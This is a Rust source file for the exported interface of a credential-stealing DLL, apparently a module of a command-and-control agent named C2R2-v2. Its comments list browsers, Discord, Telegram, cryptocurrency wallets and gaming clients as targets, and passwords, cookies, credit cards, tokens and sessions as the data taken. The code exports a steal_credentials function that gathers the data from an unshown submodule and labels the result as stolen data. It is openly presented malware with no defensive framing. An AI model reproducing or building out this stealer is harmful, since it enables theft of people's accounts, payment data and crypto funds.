//! Stealer DLL - Credential harvesting module for C2R2-v2.
//!
//! This DLL is loaded dynamically by the agent to harvest credentials, cookies,
//! and tokens from various applications. It's designed as a separate module to
//! keep the base agent lightweight.
//!
//! # Supported Targets
//!
//! - **Browsers**: Chrome, Firefox, Edge, Brave, Opera, Vivaldi
//! - **Communication**: Discord, Telegram
//! - **Wallets**: Exodus, Atomic, Electrum, Metamask
//! - **Gaming**: Steam, Epic Games
//!
//! # Exported Functions
//!
//! - `steal_credentials()` - Main harvesting function
//! - `free_credentials_string()` - Free returned strings
//! - `get_version()` - Get module version
//!
//! # Safety
//!
//! All panics are caught to prevent crashing the parent process. Errors are
//! returned as error strings rather than panicking.

#![allow(non_snake_case)]

use std::ffi::CString;
use std::os::raw::c_char;
use std::panic;

mod stealer;

/// Steals credentials from all supported sources.
///
/// This function harvests credentials, cookies, tokens, and other sensitive data
/// from browsers, communication apps, cryptocurrency wallets, and gaming platforms.
///
/// # Safety
///
/// This function catches panics to prevent crashing the parent process. If a panic
/// occurs, an error message is returned instead.
///
/// # Returns
///
/// Pointer to a C string containing the harvested data in formatted text.
/// **MUST** be freed with `free_credentials_string()` when done.
///
/// # Format
///
/// Returns multi-line text with sections for:
/// - Passwords
/// - Cookies  
/// - Autofill data
/// - Credit cards
/// - Discord tokens
/// - Telegram sessions
/// - Cryptocurrency wallets
///
/// # Errors
///
/// Returns "ERROR:..." string if harvesting fails or no data found.
#[no_mangle]
pub extern "C" fn steal_credentials() -> *mut c_char {
    // Capturar panics para no crashear el proceso principal
    let result = panic::catch_unwind(|| {
        // Ejecutar el stealer
        let stolen_data = stealer::steal_all();

        if stolen_data.is_empty() {
            return CString::new("ERROR:No se encontraron credenciales")
                .unwrap()
                .into_raw();
        }

        // Formatear datos
        let mut output = String::from("═══ DATOS ROBADOS ═══\n");
        output.push_str(&format!(
            "Total: {} items encontrados\n",
            stolen_data.total_count()
        ));
        output.push_str(&stolen_data.to_string());

        CString::new(output).unwrap().into_raw()
    });

    match result {
        Ok(ptr) => ptr,
        Err(_) => CString::new("ERROR:Panic durante steal_credentials")
            .unwrap()
            .into_raw(),
    }
}

/// Frees a string returned by `steal_credentials()`.
///
/// # Safety
///
/// This function must be called exactly once for each string returned by
/// `steal_credentials()`. Passing a null pointer is safe and does nothing.
///
/// # Arguments
///
/// * `s` - Pointer to C string to free
#[no_mangle]
pub extern "C" fn free_credentials_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}

/// Returns the version string of this DLL module.
///
/// # Returns
///
/// Pointer to C string containing version (e.g., "stealer-dll v2.0.0").
/// Must be freed with `free_credentials_string()`.
#[no_mangle]
pub extern "C" fn get_version() -> *mut c_char {
    CString::new("stealer-dll v2.0.0").unwrap().into_raw()
}

/// Windows DLL entry point.
///
/// Called by the system when the DLL is loaded or unloaded.
///
/// # Arguments
///
/// * `_hinst_dll` - Handle to the DLL module
/// * `fdw_reason` - Reason code (DLL_PROCESS_ATTACH = 1, DLL_PROCESS_DETACH = 0)
/// * `_lpv_reserved` - Reserved
///
/// # Returns
///
/// Returns 1 (TRUE) to indicate successful initialization/cleanup.
#[cfg(target_os = "windows")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: *mut std::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    match fdw_reason {
        1 => {} // DLL_PROCESS_ATTACH
        0 => {} // DLL_PROCESS_DETACH
        _ => {}
    }
    1 // TRUE
}
